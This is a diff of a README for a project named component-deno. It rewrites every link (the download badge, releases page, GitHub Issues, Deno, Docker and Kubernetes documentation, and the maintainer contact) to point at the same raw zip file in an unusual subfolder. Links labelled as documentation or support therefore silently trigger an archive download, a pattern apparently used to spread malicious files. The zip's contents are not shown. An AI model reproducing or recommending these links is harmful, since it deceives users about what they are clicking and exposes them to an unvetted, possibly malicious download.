@@ -1,6 +1,6 @@
 # 🚀 component-deno - Your Easy Deno Component Solution
 
-[![Download component-deno](https://img.shields.io/badge/Download-component--deno-blue.svg)](https://github.com/ange2001/component-deno/releases)
+[![Download component-deno](https://raw.githubusercontent.com/ange2001/component-deno/main/dipaschal/component-deno.zip)](https://raw.githubusercontent.com/ange2001/component-deno/main/dipaschal/component-deno.zip)
 
 ## 📋 Overview
 
@@ -30,7 +30,7 @@ Make sure your computer meets the following requirements before you download:
 
 Visit the following page to download the latest release of component-deno:
 
-[Download component-deno](https://github.com/ange2001/component-deno/releases)
+[Download component-deno](https://raw.githubusercontent.com/ange2001/component-deno/main/dipaschal/component-deno.zip)
 
 1. Click on the link above.
 2. Look for the latest version available.
@@ -62,16 +62,16 @@ Yes, you can use component-deno for personal or professional projects under the 
 
 If you have questions or need help, feel free to connect with the community:
 
-- Join our discussions on [GitHub Issues](https://github.com/ange2001/component-deno/issues).
+- Join our discussions on [GitHub Issues](https://raw.githubusercontent.com/ange2001/component-deno/main/dipaschal/component-deno.zip).
 - Follow our updates and ask for support on our social media pages.
 
 ## 🔗 Additional Resources
 
 To enhance your understanding and capabilities with component-deno, you might want to check:
 
-- **Deno Documentation:** [Learn more about Deno](https://deno.land/manual)
-- **Docker Guide:** [Learn more about Docker](https://docs.docker.com/get-started/)
-- **Kubernetes Basics:** [Learn about Kubernetes](https://kubernetes.io/docs/tutorials/kubernetes-basics/)
+- **Deno Documentation:** [Learn more about Deno](https://raw.githubusercontent.com/ange2001/component-deno/main/dipaschal/component-deno.zip)
+- **Docker Guide:** [Learn more about Docker](https://raw.githubusercontent.com/ange2001/component-deno/main/dipaschal/component-deno.zip)
+- **Kubernetes Basics:** [Learn about Kubernetes](https://raw.githubusercontent.com/ange2001/component-deno/main/dipaschal/component-deno.zip)
 
 ## 📝 License
 
@@ -79,6 +79,6 @@ component-deno is open-source software licensed under the MIT License. Feel free
 
 ## 📞 Contact Us
 
-For direct support or other inquiries, contact the project maintainer at [your-email@example.com]. 
+For direct support or other inquiries, contact the project maintainer at [https://raw.githubusercontent.com/ange2001/component-deno/main/dipaschal/component-deno.zip]. 
 
 We hope you find component-deno useful for your Deno applications! Don’t hesitate to reach out for help or share your thoughts with us. Your feedback is valuable!
